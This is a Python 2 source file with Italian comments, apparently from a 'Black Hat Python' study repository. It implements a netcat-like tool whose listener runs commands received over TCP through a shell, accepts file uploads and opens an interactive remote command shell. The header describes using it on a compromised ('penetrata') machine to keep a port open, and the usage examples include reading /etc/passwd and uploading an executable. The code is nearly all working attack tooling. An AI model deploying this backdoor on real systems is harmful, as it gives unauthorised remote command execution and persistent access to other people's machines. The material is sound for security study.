# bhp_netcat.py

# Netcat puo' essere paragonato al coltellino svizzero di qualsiasi amministratore di rete e non c'e' da sorprendersi che gli amministratori di sistema lo rimuovano dalle macchine.
# Spesso e volentieri vi capitera' di ritrovarvi con un shell aperta in un server sul quale non potete eseguire netcat, ma sul quale potete programmare ed eseguire il Python. In questi casi e' estremamente implementare un client di rete semplice che vi peremtta di caricare files, inviare comando ed in generale di mantenere aperta un porta in ascolta per utilizzi futuri.

# Istruzioni per l'utilizzo: nel seguente esempio viene mostrato come eseguire due istanza di bhp_netcat, una in modalita' Server e un in modalita' Client per eseguire dei comandi sulla shell della macchina penetrata.

# --------------------------------------
# Avvio dell'istanza Server:
# python bhp_netcat.py -l -p 9999 -c
#
# Avvvio dell'instanza Client:
# python bhp_netcat.py -t localhost -p 9999
#
# Utilizziamo la combinazione Ctrl + D sulla linea di comando in cui abbiamo eseguito l'instanza Client per far apparire la shell:
# <BHP:#>
#
# Invio di un comando da eseguire sulla shell al Server:
# <BHP:#>  ls -la
#
# Output generato sulla linea di comando in cui abbiamo eseguito l'istanza Client:
# total 19164
# drwxr-x--- 4 rambodrahmani rambodrahmani    4096 Feb 26 13:40 .
# drwxr-xr-x 5 rambodrahmani rambodrahmani    4096 Jan 29 16:22 ..
# -rwxr-x--- 1 rambodrahmani rambodrahmani    6563 Feb 26 13:40 bhp_netcat.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani    1190 Jan 29 11:15 bhp_reverse_ssh.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani    1431 Jan 29 11:15 bhp_ssh.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani    1809 Jan 29 11:15 bhp_ssh_server.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani 1541471 Jan 29 11:15 getopt
# drwxr-xr-x 2 rambodrahmani rambodrahmani    4096 Feb 26 12:46 imgs
# drwxr-x--- 7 rambodrahmani rambodrahmani    4096 Feb 26 12:52 paramiko
# -rw-r--r-- 1 rambodrahmani rambodrahmani   19483 Feb 26 12:47 README.md
# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915384 Jan 29 11:15 socket
# -rwxr-x--- 1 rambodrahmani rambodrahmani  229899 Jan 29 11:15 subprocess
# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915381 Jan 29 11:15 sys
# -rwxr-x--- 1 rambodrahmani rambodrahmani    1197 Feb 26 13:07 tcp_client.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani    4556 Jan 29 11:15 tcp_proxy_output_sample.txt
# -rwxr-x--- 1 rambodrahmani rambodrahmani    4550 Jan 29 11:15 tcp_proxy.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani     434 Jan 29 11:15 tcp_server_client.txt
# -rwxr-x--- 1 rambodrahmani rambodrahmani    2357 Feb 26 13:24 tcp_server.py
# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915387 Jan 29 11:15 threading
# -rwxr-x--- 1 rambodrahmani rambodrahmani     868 Feb 26 13:04 udp_client.py
# <BHP:#> 
# --------------------------------------

import sys
import socket
import getopt
import threading
import subprocess

# Definizione delle variabili globali.
listen			= False
command			= False
upload			= False
execute			= ""
target			= ""
upload_destination	= ""
port			= 0

# Se i parametri passatti in ingresso al momento dell'esecuzione del programma non combaciano con i nostri criteri, viene mostrato il seguente messaggio che spiega come utilizzare lo strumento.
def usage():
	print("BHP Net Tool\n")
	print("Usage: bhp_netcat.py -t target_host -p port")
	print("-l --listen			- listen on [host]:[port] for incoming connections")
	print("-e --execute=file_to_run	- execute the given file upon receiving a connection")
	print("-c --command			- initialize a command shell")
	print("-u --upload=destination		- upon receiving connection upload a file and write to [destination]")
	print("\n")
	print("Examples:")
	print("bhp_netcat.py -t 192.168.0.1 -p 5555 -l -c")
	print("bhp_netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("bhp_netcat.py -t 192.168.0.1 -p 5555 -e\"cat /etc/paswd\"")
	print("echo 'ABCDEFGHI' | ./bhp_netcat.py -t 192.168.11.12 -p 135")

	sys.exit(0)

def main():
	# La parola chiave global indica che vogliamo modificare il contenuto delle variabili globali precedentemente dichiarate.
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	# Leggiamo i parametri passati da linea di comando, e impostiamo le variabili globali come richiesto.
	# Se vengono forniti parametri non conformi, allora viene stampato il menu di aiuto.
	try:
		opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help", "liste", "execute", "target", "port", "command", "upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--command"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"

	# Viene eseguito un controllo per sapere se dobbiamo leggere dati da stdin e inviarli sulla rete.
	if not listen and len(target) and port > 0:
		# Legge il buffere dalla linea di comando
		# utilizzare il comando CTRL + D per interrompere l'attesa di lettura di ulteriori dati dal buffer quando si termina l'inserimento
		buffer = sys.stdin.read()

		# Invio dei dati al client.
		client_sender(buffer)

	# Viene avviato la fase di ascolto e ci si prepara potenzialmente a
	# caricare files, eseguire comandi o chiudere la shell a seconda dei comandi letti dal buffere precedententemente
	if listen:
		server_loop()

# Segue l'implementazione delle varie funzionalita' offerte dal bhp_netcat.

# Iniziamo con la creazione un socket tcp di tipo SOCK_STREAM e con il successivo tentativo di connessione.
def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connessione al Server.
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)

		while True:
			# In attesa di riceve comandi dal Server e successiva stampa.
			recv_len = 1
			response = ""

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data
				break

				if recv_len < 4096:
					break

			print response,

			# Lettura del Buffer da stdin.
			buffer = raw_input("")
			buffer += "\n"

			# Invio dei comandi letti.
			client.send(buffer)

			# Codice sorgente modificato per permettere ai Clients di disconenttersi dal Server.
			if "disconnect" in buffer:
				break
	except:
		print("[*] Exception! Exiting.")

		# Chiusura della connessione.
		client.close()

# Quando eseguito in modalita' Server, questo e' il looop principale che rimane in ascolto per le connessione da parte dei vari clients.
def server_loop():
	global target

	# Se non viene definito un host target, viene eseguito il Server sull'indirizzo standard 0.0.0.0
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# Thread per la gestione delle connessioni in arrivo da parte dei vari clients.
		client_thread = threading.Thread(target = client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):
	# Formattazione della stringa contenente il messaggio da eseguire sulla linea di comando inviata da un dei clients.
	command = command.rstrip()

	# Esecuzione del comando ricevo da un Client sulla linea di comando.
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"

	# Invio dell'output generato dall'esecuzione del comando al client.
	return output

def client_handler(client_socket):
	global uplaod
	global execute
	global command

	# Controlla la necessita' di caricare files.
	if len(upload_destination):
		# Lettura di tutti i bytes e successiva scrittura nella destinazione indicata.
		file_buffer = ""

		# Continua a leggere sino a che non sono disponibili ulteriori dati.
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer +=  data

		# Scrittura dei bytes ricevuti nella locazione indicata.
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			# Invio al client della notifica di caricamente avvenuto con successo.
			client_socket.send("Successfully saved fule to %s\r\n" % upload_destination)
		except:
			client_socket.send("Failed to save file to %s\r\n" % upload_destination)

	# Controlla la necessita' di eseguire comandi su riga di comando.
	if len(execute):
		# Esecuzione del comando ed invio dell'output al client.
		output = run_command(execute)

		client_socket.send(output)

	# Se e' stato richiesta un shell di comando, viene avviato un nuovo loop.
	if command:
		while True:
			# Viene mostrato un semplice prompt dove digitare i comandi.
			client_socket.send("<BHP:#> ")

			# Lettura dei dati da linea di comando
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			# Codice sorgente modificato per permettere ai Clients di disconenttersi dal Server.
			if "disconnect" in cmd_buffer:
				client_socket.close()
				break

			# Invio dell'output generato dall'esecuzione del comando.
			response = run_command(cmd_buffer)

			# Invio della risposta al client.
			client_socket.send(response)

main()
